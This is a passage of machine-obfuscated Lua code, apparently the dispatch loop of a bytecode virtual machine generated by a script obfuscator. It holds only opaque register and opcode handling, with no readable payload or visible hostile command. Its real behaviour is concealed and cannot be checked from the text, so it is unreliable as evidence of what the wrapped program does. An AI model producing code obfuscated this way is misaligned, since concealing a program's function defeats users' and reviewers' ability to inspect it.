n=y[424];end;end;elseif(z<=37)then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba>0 then w[y[716]]=w[y[424]];else bb=nil end else if 3~=ba then n=n+1;else y=f[n];end end else if ba<=5 then if ba<5 then w[y[716]]=y[424];else n=n+1;end else if 6<ba then w[y[716]]=y[424];else y=f[n];end end end else if ba<=11 then if ba<=9 then if ba<9 then n=n+1;else y=f[n];end else if ba~=11 then w[y[716]]=y[424];else n=n+1;end end else if ba<=13 then if ba~=13 then y=f[n];else bb=y[716]end else if ba==14 then w[bb]=w[bb](r(w,bb+1,y[424]))else break end end end end ba=ba+1 end elseif not(z~=38)then local ba,bb=0 while true do if ba<=11 then if ba<=5 then if ba<=2 then if ba<=0 then bb=nil else if ba>1 then n=n+1;else w[y[716]]=w[y[424]]%w[y[676]];end end else if ba<=3 then y=f[n];else if 5~=ba then w[y[716]]=w[y[424]]+y[676];else n=n+1;end end end else if ba<=8 then if ba<=6 then y=f[n];else if 7<ba then n=n+1;else w[y[716]]=h[y[424]];end end else if ba<=9 then y=f[n];else if ba>10 then n=n+1;else w[y[716]]=w[y[424]];end end end end else if ba<=17 then if ba<=14 then if ba<=12 then y=f[n];else if ba==13 then w[y[716]]=w[y[424]];else n=n+1;end end else if ba<=15 then y=f[n];else if ba>16 then n=n+1;else w[y[716]]=w[y[424]];end end end else if ba<=20 then if ba<=18 then y=f[n];else if 19<ba then n=n+1;else w[y[716]]=w[y[424]];end end else if ba<=22 then if 22~=ba then y=f[n];else bb=y[716]end else if 24>ba then w[bb]=w[bb](r(w,bb+1,y[424]))else break end end end end end ba=ba+1 end else local ba=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if 0==ba then w[y[716]]=w[y[424]][y[676]];else n=n+1;end else if ba==2 then y=f[n];else w[y[716]][y[424]]=w[y[676]];end end else if ba<=5 then if ba~=5 then n=n+1;else y=f[n];end else if 7>ba then w[y[716]]=w[y[424]][y[676]];else n=n+1;end end end else if ba<=11 then if ba<=9 then if 9>ba then y=f[n];else w[y[716]]=h[y[424]];end else if 11~=ba then n=n+1;else y=f[n];end end else if ba<=13 then if ba~=13 then w[y[716]]=w[y[424]][y[676]];else n=n+1;end else if ba<=14 then y=f[n];else if 15<ba then break else if(w[y[716]]~=w[y[676]])then n=n+1;else n=y[424];end;end end end end end ba=ba+1 end end;elseif z<=42 then if z<=40 then w[y[716]]=y[424]*w[y[676]];elseif 41<z then w[y[716]]=w[y[424]][w[y[676]]];else w[y[716]]=#w[y[424]];end;elseif z<=43 then w[y[716]]=w[y[424]];elseif z>44 then local ba;w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][w[y[676]]];n=n+1;y=f[n];w[y[716]]={};n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]][y[424]]=w[y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]][y[424]]=w[y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]][y[424]]=w[y[676]];n=n+1;y=f[n];ba=y[716]w[ba](r(w,ba+1,y[424]))else local ba;w[y[716]][y[424]]=w[y[676]];n=n+1;y=f[n];w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]];n=n+1;y=f[n];ba=y[716]w[ba](r(w,ba+1,y[424]))end;elseif z<=68 then if z<=56 then if 50>=z then if z<=47 then if 46==z then w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]]+y[676];n=n+1;y=f[n];h[y[424]]=w[y[716]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]();else local ba;w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]={};n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]={};n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];ba=y[716]w[ba]=w[ba]()end;elseif z<=48 then w[y[716]]=w[y[424]]-w[y[676]];elseif 50~=z then local ba;w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=false;n=n+1;y=f[n];ba=y[716]w[ba](w[ba+1])else w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]={};n=n+1;y=f[n];w[y[716]]={};n=n+1;y=f[n];w[y[716]][y[424]]=w[y[676]];n=n+1;y=f[n];w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];if w[y[716]]then n=n+1;else n=y[424];end;end;elseif z<=53 then if 51>=z then w[y[716]]=y[424];elseif z~=53 then w[y[716]]={};else w[y[716]]=w[y[424]][y[676]];end;elseif z<=54 then local ba=0 while true do if ba<=6 then if ba<=2 then if ba<=0 then w[y[716]]=h[y[424]];else if 2~=ba then n=n+1;else y=f[n];end end else if ba<=4 then if 3==ba then w[y[716]]=h[y[424]];else n=n+1;end else if 5<ba then w[y[716]]=w[y[424]][y[676]];else y=f[n];end end end else if ba<=9 then if ba<=7 then n=n+1;else if 9~=ba then y=f[n];else w[y[716]]=w[y[424]][w[y[676]]];end end else if ba<=11 then if 10==ba then n=n+1;else y=f[n];end else if 12==ba then if(w[y[716]]~=y[676])then n=n+1;else n=y[424];end;else break end end end end ba=ba+1 end elseif 55<z then local ba;local bb;local bc;w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][w[y[676]]];n=n+1;y=f[n];bc=y[716]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[676]do ba=ba+1;w[bd]=bb[ba];end else w[y[716]]=h[y[424]];end;elseif z<=62 then if z<=59 then if 57>=z then local ba=y[716];do return w[ba](r(w,ba+1,y[424]))end;elseif 59>z then local ba;w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][w[y[676]]];n=n+1;y=f[n];ba=y[716]w[ba]=w[ba](r(w,ba+1,y[424]))else local ba=y[716]local bb,bc=i(w[ba](w[ba+1]))p=bc+ba-1 local bc=0;for bd=ba,p do bc=bc+1;w[bd]=bb[bc];end;end;elseif 60>=z then w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];if w[y[716]]then n=n+1;else n=y[424];end;elseif z~=62 then local ba;w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];ba=y[716]w[ba]=w[ba](r(w,ba+1,y[424]))else if(w[y[716]]~=w[y[676]])then n=y[424];else n=n+1;end;end;elseif z<=65 then if 63>=z then w[y[716]]=w[y[424]]+y[676];elseif z~=65 then local ba;w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];ba=y[716]w[ba]=w[ba](r(w,ba+1,y[424]))else local ba;w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][w[y[676]]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];ba=y[716]w[ba]=w[ba](r(w,ba+1,y[424]))end;elseif z<=66 then local ba;local bb;local bc;w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][w[y[676]]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];bc=y[424];bb=y[676];ba=k(w,g,bc,bb);w[y[716]]=ba;elseif 68~=z then w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;else local ba=y[716]w[ba](w[ba+1])end;elseif z<=80 then if 74>=z then if z<=71 then if(z==69 or z<69)then local ba=0 while true do if ba<=14 then if ba<=6 then if ba<=2 then if ba<=0 then w={};else if 1==ba then for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;else n=n+1;end end else if ba<=4 then if 4>ba then y=f[n];else w[y[716]]=h[y[424]];end else if 6>ba then n=n+1;else y=f[n];end end end else if ba<=10 then if ba<=8 then if 8~=ba then w[y[716]]=w[y[424]][y[676]];else n=n+1;end else if 9==ba then y=f[n];else w[y[716]]=h[y[424]];end end else if ba<=12 then if ba>11 then y=f[n];else n=n+1;end else if ba==13 then w[y[716]]={};else n=n+1;end end end end else if ba<=21 then if ba<=17 then if ba<=15 then y=f[n];else if ba<17 then w[y[716]]={};else n=n+1;end end else if ba<=19 then if ba~=19 then y=f[n];else w[y[716]][y[424]]=w[y[676]];end else if ba==20 then n=n+1;else y=f[n];end end end else if ba<=25 then if ba<=23 then if ba==22 then w[y[716]]=j[y[424]];else n=n+1;end else if 25>ba then y=f[n];else w[y[716]]=w[y[424]][y[676]];end end else if ba<=27 then if ba<27 then n=n+1;else y=f[n];end else if 28<ba then break else if w[y[716]]then n=n+1;else n=y[424];end;end end end end end ba=ba+1 end elseif(71>z)then local ba,bb=0 while true do if ba<=79 then if ba<=39 then if ba<=19 then if ba<=9 then if ba<=4 then if ba<=1 then if 1~=ba then bb=nil else w[y[716]]=h[y[424]];end else if ba<=2 then n=n+1;else if ba>3 then w[y[716]]=w[y[424]][y[676]];else y=f[n];end end end else if ba<=6 then if 6~=ba then n=n+1;else y=f[n];end else if ba<=7 then w[y[716]]=h[y[424]];else if ba<9 then n=n+1;else y=f[n];end end end end else if ba<=14 then if ba<=11 then if ba>10 then n=n+1;else w[y[716]]=w[y[424]][y[676]];end else if ba<=12 then y=f[n];else if 13==ba then w[y[716]][w[y[424]]]=w[y[676]];else n=n+1;end end end else if ba<=16 then if ba~=16 then y=f[n];else w[y[716]]=h[y[424]];end else if ba<=17 then n=n+1;else if ba==18 then y=f[n];else w[y[716]]=w[y[424]][y[676]];end end end end end else if ba<=29 then if ba<=24 then if ba<=21 then if 20<ba then y=f[n];else n=n+1;end else if ba<=22 then w[y[716]]=h[y[424]];else if 24~=ba then n=n+1;else y=f[n];end end end else if ba<=26 then if ba~=26 then w[y[716]]=w[y[424]][y[676]];else n=n+1;end else if ba<=27 then y=f[n];else if 29>ba then w[y[716]][w[y[424]]]=w[y[676]];else n=n+1;end end end end else if ba<=34 then if ba<=31 then if 30==ba then y=f[n];else w[y[716]]=h[y[424]];end else if ba<=32 then n=n+1;else if 34>ba then y=f[n];else w[y[716]]=w[y[424]][y[676]];end end end else if ba<=36 then if ba<36 then n=n+1;else y=f[n];end else if ba<=37 then w[y[716]]=h[y[424]];else if ba==38 then n=n+1;else y=f[n];end end end end end end else if ba<=59 then if ba<=49 then if ba<=44 then if ba<=41 then if ba>40 then n=n+1;else w[y[716]]=w[y[424]][y[676]];end else if ba<=42 then y=f[n];else if ba>43 then n=n+1;else w[y[716]][w[y[424]]]=w[y[676]];end end end else if ba<=46 then if ba~=46 then y=f[n];else w[y[716]]=h[y[424]];end else if ba<=47 then n=n+1;else if ba~=49 then y=f[n];else w[y[716]]=w[y[424]][y[676]];end end end end else if ba<=54 then if ba<=51 then if 51~=ba then n=n+1;else y=f[n];end else if ba<=52 then w[y[716]]=h[y[424]];else if 53==ba then n=n+1;else y=f[n];end end end else if ba<=56 then if ba==55 then w[y[716]]=w[y[424]][y[676]];else n=n+1;end else if ba<=57 then y=f[n];else if 59>ba then w[y[716]][w[y[424]]]=w[y[676]];else n=n+1;end end end end end else if ba<=69 then if ba<=64 then if ba<=61 then if 61~=ba then y=f[n];else w[y[716]]=h[y[424]];end else if ba<=62 then n=n+1;else if ba==63 then y=f[n];else w[y[716]]=w[y[424]][y[676]];end end end else if ba<=66 then if ba<66 then n=n+1;else y=f[n];end else if ba<=67 then w[y[716]]=h[y[424]];else if ba~=69 then n=n+1;else y=f[n];end end end end else if ba<=74 then if ba<=71 then if ba<71 then w[y[716]]=w[y[424]][y[676]];else n=n+1;end else if ba<=72 then y=f[n];else if ba~=74 then w[y[716]][w[y[424]]]=w[y[676]];else n=n+1;end end end else if ba<=76 then if ba<76 then y=f[n];else w[y[716]]=h[y[424]];end else if ba<=77 then n=n+1;else if 79>ba then y=f[n];else w[y[716]]=w[y[424]][y[676]];end end end end end end end else if ba<=119 then if ba<=99 then if ba<=89 then if ba<=84 then if ba<=81 then if ba~=81 then n=n+1;else y=f[n];end else if ba<=82 then w[y[716]]=h[y[424]];else if ba~=84 then n=n+1;else y=f[n];end end end else if ba<=86 then if ba~=86 then w[y[716]]=w[y[424]][y[676]];else n=n+1;end else if ba<=87 then y=f[n];else if 88<ba then n=n+1;else w[y[716]][w[y[424]]]=w[y[676]];end end end end else if ba<=94 then if ba<=91 then if ba>90 then w[y[716]]=h[y[424]];else y=f[n];end else if ba<=92 then n=n+1;else if 94~=ba then y=f[n];else w[y[716]]=w[y[424]][y[676]];end end end else if ba<=96 then if ba>95 then y=f[n];else n=n+1;end else if ba<=97 then w[y[716]]=h[y[424]];else if 99~=ba then n=n+1;else y=f[n];end end end end end else if ba<=109 then if ba<=104 then if ba<=101 then if 100<ba then n=n+1;else w[y[716]]=w[y[424]][y[676]];end else if ba<=102 then y=f[n];else if 103<ba then n=n+1;else w[y[716]][w[y[424]]]=w[y[676]];end end end else if ba<=106 then if 105<ba then w[y[716]]=h[y[424]];else y=f[n];end else if ba<=107 then n=n+1;else if ba>108 then w[y[716]]=w[y[424]][y[676]];else y=f[n];end end end end else if ba<=114 then if ba<=111 then if 110<ba then y=f[n];else n=n+1;end else if ba<=112 then w[y[716]]=h[y[424]];else if ba>113 then y=f[n];else n=n+1;end end end else if ba<=116 then if 116>ba then w[y[716]]=w[y[424]][y[676]];else n=n+1;end else if ba<=117 then y=f[n];else if ba==118 then w[y[716]][w[y[424]]]=w[y[676]];else n=n+1;end end end end end end else if ba<=139 then if ba<=129 then if ba<=124 then if ba<=121 then if 121>ba then y=f[n];else w[y[716]]=h[y[424]];end else if ba<=122 then n=n+1;else if ba>123 then w[y[716]]=w[y[424]][y[676]];else y=f[n];end end end else if ba<=126 then if 126~=ba then n=n+1;else y=f[n];end else if ba<=127 then w[y[716]]=h[y[424]];else if 129>ba then n=n+1;else y=f[n];end end end end else if ba<=134 then if ba<=131 then if 131>ba then w[y[716]]=w[y[424]][y[676]];else n=n+1;end else if ba<=132 then y=f[n];else if 134~=ba then w[y[716]][w[y[424]]]=w[y[676]];else n=n+1;end end end else if ba<=136 then if ba~=136 then y=f[n];else w[y[716]]=h[y[424]];end else if ba<=137 then n=n+1;else if 138<ba then w[y[716]]=w[y[424]][y[676]];else y=f[n];end end end end end else if ba<=149 then if ba<=144 then if ba<=141 then if ba==140 then n=n+1;else y=f[n];end else if ba<=142 then w[y[716]]=h[y[424]];else if ba~=144 then n=n+1;else y=f[n];end end end else if ba<=146 then if ba==145 then w[y[716]]=w[y[424]][y[676]];else n=n+1;end else if ba<=147 then y=f[n];else if 149~=ba then w[y[716]][w[y[424]]]=w[y[676]];else n=n+1;end end end end else if ba<=154 then if ba<=151 then if ba==150 then y=f[n];else w[y[716]]=j[y[424]];end else if ba<=152 then n=n+1;else if ba~=154 then y=f[n];else w[y[716]]=w[y[424]];end end end else if ba<=156 then if 155<ba then y=f[n];else n=n+1;end else if ba<=157 then bb=y[716]else if ba>158 then break else w[bb]=w[bb](w[bb+1])end end end end end end end end ba=ba+1 end else if(not(w[y[716]]==y[676]))then n=(n+1);else n=y[424];end;end;elseif z<=72 then local ba,bb=0 while true do if ba<=10 then if ba<=4 then if ba<=1 then if ba~=1 then bb=nil else w={};end else if ba<=2 then for bc=0,u,1 do if bc<o then w[bc]=s[bc+1];else break;end;end;else if ba<4 then n=n+1;else y=f[n];end end end else if ba<=7 then if ba<=5 then w[y[716]]=h[y[424]];else if 7>ba then n=n+1;else y=f[n];end end else if ba<=8 then w[y[716]]=w[y[424]][y[676]];else if ba~=10 then n=n+1;else y=f[n];end end end end else if ba<=16 then if ba<=13 then if ba<=11 then w[y[716]]=h[y[424]];else if 13>ba then n=n+1;else y=f[n];end end else if ba<=14 then w[y[716]]=h[y[424]];else if 15==ba then n=n+1;else y=f[n];end end end else if ba<=19 then if ba<=17 then w[y[716]]=w[y[424]][w[y[676]]];else if ba==18 then n=n+1;else y=f[n];end end else if ba<=20 then bb=y[716]else if ba>21 then break else w[bb](w[bb+1])end end end end end ba=ba+1 end elseif 73<z then local ba=y[716]w[ba]=w[ba](r(w,ba+1,y[424]))else local ba;local bb;w[y[716]]={};n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]={};n=n+1;y=f[n];w[y[716]]={};n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]][y[424]]=w[y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]][y[424]]=w[y[676]];n=n+1;y=f[n];w[y[716]][y[424]]=w[y[676]];n=n+1;y=f[n];w[y[716]]={r({},1,y[424])};n=n+1;y=f[n];w[y[716]]=w[y[424]];n=n+1;y=f[n];bb=y[716];ba=w[bb];for bc=bb+1,y[424]do t(ba,w[bc])end;end;elseif 77>=z then if 75>=z then local ba=0 while true do if ba<=6 then if ba<=2 then if ba<=0 then w[y[716]]=w[y[424]][y[676]];else if 2~=ba then n=n+1;else y=f[n];end end else if ba<=4 then if ba==3 then w[y[716]]=w[y[424]][y[676]];else n=n+1;end else if 6>ba then y=f[n];else w[y[716]]=w[y[424]][y[676]];end end end else if ba<=9 then if ba<=7 then n=n+1;else if ba==8 then y=f[n];else w[y[716]][y[424]]=w[y[676]];end end else if ba<=11 then if 11~=ba then n=n+1;else y=f[n];end else if 13>ba then n=y[424];else break end end end end ba=ba+1 end elseif z>76 then local ba;local bb;local bc;w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];bc=y[424];bb=y[676];ba=k(w,g,bc,bb);w[y[716]]=ba;else local ba;w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];ba=y[716]w[ba]=w[ba](r(w,ba+1,y[424]))end;elseif 78>=z then local ba,bb,bc=0 while true do if ba<=24 then if ba<=11 then if ba<=5 then if ba<=2 then if ba<=0 then bb=nil else if ba<2 then bc=nil else w[y[716]]={};end end else if ba<=3 then n=n+1;else if 5>ba then y=f[n];else w[y[716]]=h[y[424]];end end end else if ba<=8 then if ba<=6 then n=n+1;else if 8>ba then y=f[n];else w[y[716]]=w[y[424]][y[676]];end end else if ba<=9 then n=n+1;else if ba==10 then y=f[n];else w[y[716]]=h[y[424]];end end end end else if ba<=17 then if ba<=14 then if ba<=12 then n=n+1;else if 14~=ba then y=f[n];else w[y[716]]=w[y[424]][y[676]];end end else if ba<=15 then n=n+1;else if 17~=ba then y=f[n];else w[y[716]]=w[y[424]][y[676]];end end end else if ba<=20 then if ba<=18 then n=n+1;else if ba~=20 then y=f[n];else w[y[716]]={};end end else if ba<=22 then if 22~=ba then n=n+1;else y=f[n];end else if 23==ba then w[y[716]]={};else n=n+1;end end end end end else if ba<=37 then if ba<=30 then if ba<=27 then if ba<=25 then y=f[n];else if 26<ba then n=n+1;else w[y[716]]=h[y[424]];end end else if ba<=28 then y=f[n];else if ba==29 then w[y[716]][y[424]]=w[y[676]];else n=n+1;end end end else if ba<=33 then if ba<=31 then y=f[n];else if ba==32 then w[y[716]]=h[y[424]];else n=n+1;end end else if ba<=35 then if 34<ba then w[y[716]][y[424]]=w[y[676]];else y=f[n];end else if 36<ba then y=f[n];else n=n+1;end end end end else if ba<=43 then if ba<=40 then if ba<=38 then w[y[716]][y[424]]=w[y[676]];else if ba==39 then n=n+1;else y=f[n];end end else if ba<=41 then w[y[716]]={r({},1,y[424])};else if 43~=ba then n=n+1;else y=f[n];end end end else if ba<=46 then if ba<=44 then w[y[716]]=w[y[424]];else if 46~=ba then n=n+1;else y=f[n];end end else if ba<=48 then if 48>ba then bc=y[716];else bb=w[bc];end else if 50~=ba then for bd=bc+1,y[424]do t(bb,w[bd])end;else break end end end end end end ba=ba+1 end elseif z<80 then local ba;w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]];n=n+1;y=f[n];ba=y[716]w[ba](r(w,ba+1,y[424]))else local ba;local bb;local bc;w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][w[y[676]]];n=n+1;y=f[n];bc=y[716]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[676]do ba=ba+1;w[bd]=bb[ba];end end;elseif 86>=z then if z<=83 then if z<=81 then local ba=y[716];local bb=w[ba];for bc=ba+1,y[424]do t(bb,w[bc])end;elseif z>82 then local ba=w[y[716]]+y[676];w[y[716]]=ba;if(ba<=w[y[716]+1])then n=y[424];end;else local ba;local bb,bc;local bd;w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];bd=y[716]bb,bc=i(w[bd](r(w,bd+1,y[424])))p=bc+bd-1 ba=0;for bc=bd,p do ba=ba+1;w[bc]=bb[ba];end;end;elseif z<=84 then local ba=y[716];do return w[ba],w[ba+1]end elseif z>85 then local ba;local bb;local bc;w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][w[y[676]]];n=n+1;y=f[n];bc=y[716]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[676]do ba=ba+1;w[bd]=bb[ba];end else w[y[716]]=w[y[424]][y[676]];end;elseif 89>=z then if 87>=z then w[y[716]][y[424]]=y[676];n=n+1;y=f[n];w[y[716]]={};n=n+1;y=f[n];w[y[716]][y[424]]=w[y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]][y[424]]=w[y[676]];n=n+1;y=f[n];w[y[716]][y[424]]=w[y[676]];elseif z==88 then w[y[716]]=w[y[424]]*y[676];else local ba;local bb;local bc;w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][w[y[676]]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];bc=y[424];bb=y[676];ba=k(w,g,bc,bb);w[y[716]]=ba;end;elseif 90>=z then local ba;w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];ba=y[716]w[ba]=w[ba](r(w,ba+1,y[424]))elseif 92>z then local ba;w[y[716]]={};n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]][w[y[424]]]=w[y[676]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]][w[y[424]]]=w[y[676]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]][w[y[424]]]=w[y[676]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]][w[y[424]]]=w[y[676]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]][w[y[424]]]=w[y[676]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]][w[y[424]]]=w[y[676]];n=n+1;y=f[n];w[y[716]]={};n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]][w[y[424]]]=w[y[676]];n=n+1;y=f[n];w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]];n=n+1;y=f[n];ba=y[716]w[ba](r(w,ba+1,y[424]))else local ba;w[y[716]][y[424]]=w[y[676]];n=n+1;y=f[n];w[y[716]]={};n=n+1;y=f[n];w[y[716]][y[424]]=y[676];n=n+1;y=f[n];w[y[716]][y[424]]=w[y[676]];n=n+1;y=f[n];ba=y[716]w[ba]=w[ba](r(w,ba+1,y[424]))end;elseif z<=139 then if z<=115 then if 103>=z then if z<=97 then if(94>=z)then if(94~=z)then local ba,bb,bc,bd=0 while true do if(ba<9 or ba==9)then if(ba==4 or ba<4)then if(ba<1 or ba==1)then if ba>0 then bc=nil else bb=nil end else if ba<=2 then bd=nil else if ba~=4 then w[y[716]]=h[y[424]];else n=n+1;end end end else if(ba==6 or ba<6)then if(6>ba)then y=f[n];else w[y[716]]=h[y[424]];end else if ba<=7 then n=n+1;else if(ba<9)then y=f[n];else w[y[716]]=w[y[424]][y[676]];end end end end else if(ba==14 or ba<14)then if ba<=11 then if(ba<11)then n=n+1;else y=f[n];end else if ba<=12 then w[y[716]]=w[y[424]][w[y[676]]];else if(14>ba)then n=(n+1);else y=f[n];end end end else if(ba<=16)then if not(ba~=15)then bd=y[716]else bc={w[bd](w[bd+1])};end else if(ba<17 or ba==17)then bb=0;else if 18<ba then break else for be=bd,y[676]do bb=(bb+1);w[be]=bc[bb];end end end end end end ba=(ba+1)end else local ba,bb=0 while true do if(ba==12 or ba<12)then if(ba==5 or ba<5)then if ba<=2 then if(ba==0 or ba<0)then bb=nil else if ba<2 then w={};else for bc=0,u,1 do if(bc<o)then w[bc]=s[(bc+1)];else break;end;end;end end else if ba<=3 then n=(n+1);else if 5>ba then y=f[n];else w[y[716]]=h[y[424]];end end end else if(ba==8 or ba<8)then if ba<=6 then n=n+1;else if not(ba==8)then y=f[n];else w[y[716]]=j[y[424]];end end else if(ba<=10)then if 9<ba then y=f[n];else n=n+1;end else if 12>ba then w[y[716]]=w[y[424]][y[676]];else n=(n+1);end end end end else if(ba<=18)then if(ba==15 or ba<15)then if ba<=13 then y=f[n];else if not(15==ba)then w[y[716]]=y[424];else n=n+1;end end else if ba<=16 then y=f[n];else if ba<18 then w[y[716]]=y[424];else n=(n+1);end end end else if ba<=21 then if(ba<19 or ba==19)then y=f[n];else if ba<21 then w[y[716]]=y[424];else n=(n+1);end end else if(ba==23 or ba<23)then if not(23==ba)then y=f[n];else 